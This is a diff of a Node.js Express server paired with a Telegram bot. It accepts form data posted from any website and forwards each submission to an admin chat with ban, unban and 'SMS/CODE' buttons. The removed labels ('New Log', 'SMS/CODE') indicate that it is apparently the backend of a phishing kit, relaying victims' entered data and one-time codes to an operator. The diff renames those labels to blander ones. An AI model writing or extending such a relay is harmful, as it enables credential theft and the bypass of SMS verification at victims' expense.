@@ -2,68 +2,69 @@ const express = require("express");
 const TelegramBot = require("node-telegram-bot-api");
 
 const app = express();
+
+// чтобы сайт мог отправлять
 app.use(express.json());
+app.use((req, res, next) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Headers", "*");
+  next();
+});
 
 const token = process.env.BOT_TOKEN;
 const adminId = process.env.ADMIN_CHAT_ID;
 
 const bot = new TelegramBot(token, { polling: true });
 
-console.log("STARTED");
+console.log("SERVER + BOT STARTED");
 
-// обычные сообщения
-bot.on("message", (msg) => {
-  if (msg.text === "/id") {
-    bot.sendMessage(msg.chat.id, "Твой ID: " + msg.chat.id);
-  } else if (msg.text === "/test") {
-    const requestId = Date.now();
+// показать ID
+bot.onText(/\/id/, (msg) => {
+  bot.sendMessage(msg.chat.id, "Твой ID: " + msg.chat.id);
+});
 
-    bot.sendMessage(adminId, "🆕 Тест заявка ID: " + requestId, {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "🚫 Бан", callback_data: "ban_" + requestId },
-            { text: "✅ Разбан", callback_data: "unban_" + requestId }
-          ],
-          [
-            { text: "➡️ SMS/CODE", callback_data: "allow_" + requestId }
-          ]
+// тест
+bot.onText(/\/test/, (msg) => {
+  const id = Date.now();
+
+  bot.sendMessage(adminId, "🆕 Тест заявка ID: " + id, {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "🚫 Бан", callback_data: "ban_" + id },
+          { text: "✅ Разбан", callback_data: "unban_" + id }
+        ],
+        [
+          { text: "➡️ Разрешить", callback_data: "allow_" + id }
         ]
-      }
-    });
-  }
+      ]
+    }
+  });
 });
 
 // кнопки
 bot.on("callback_query", (q) => {
-  console.log("CLICK:", q.data);
-
-  let text = "";
-
-  if (q.data.startsWith("ban")) text = "🚫 пользователь забанен";
-  if (q.data.startsWith("unban")) text = "✅ пользователь разбанен";
-  if (q.data.startsWith("allow")) text = "➡️ SMS/CODE";
-
-  bot.answerCallbackQuery(q.id, { text });
+  bot.answerCallbackQuery(q.id, { text: "нажал: " + q.data });
 });
 
-// API от сайта
+// ПРИЕМ С САЙТА
 app.post("/send", (req, res) => {
-  const data = req.body;
-  const requestId = Date.now();
+  console.log("ПРИШЛО:", req.body);
+
+  const id = Date.now();
 
   bot.sendMessage(
     adminId,
-    "👻 Новый Лог 🔥ID: " + requestId + "\n\n" + JSON.stringify(data, null, 2),
+    "🆕 ЗАЯВКА ID: " + id + "\n\n" + JSON.stringify(req.body, null, 2),
     {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "🚫 Бан", callback_data: "ban_" + requestId },
-            { text: "✅ Разбан", callback_data: "unban_" + requestId }
+            { text: "🚫 Бан", callback_data: "ban_" + id },
+            { text: "✅ Разбан", callback_data: "unban_" + id }
           ],
           [
-            { text: "➡️ SMS/CODE", callback_data: "allow_" + requestId }
+            { text: "➡️ Разрешить", callback_data: "allow_" + id }
           ]
         ]
       }
@@ -73,7 +74,7 @@ app.post("/send", (req, res) => {
   res.json({ ok: true });
 });
 
-// проверка сервера
+// проверка
 app.get("/", (req, res) => {
   res.send("ok");
 });
